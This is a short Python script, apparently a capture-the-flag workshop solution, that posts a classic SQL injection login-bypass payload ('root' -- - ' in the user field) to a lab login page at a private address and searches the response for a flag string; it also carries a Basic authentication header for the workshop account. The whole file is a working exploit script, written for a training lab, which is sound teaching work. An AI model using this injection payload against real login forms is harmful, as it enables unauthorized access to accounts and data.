from requests import post
from re import search

URL = 'http://10.0.23.24:8080/sqli/level01/index.php'
HEADERS = {'Authorization': 'Basic d29ya3Nob3A6d29ya3Nob3A='}

def main() -> None:
    data = {'user': 'root\' -- - ', 'pass': '123'}
    # send a POST request and exploit the SQLi vulnerability
    response = post(URL, headers=HEADERS, data=data)

    # try to find the flag by using a regular exression
    flag = search(r'fau-ctf-[0-9a-fA-F]{32}', response.text)

    # if the flag is found, print it
    if flag:
        print(flag.group(0))

if __name__ == '__main__':
    main()
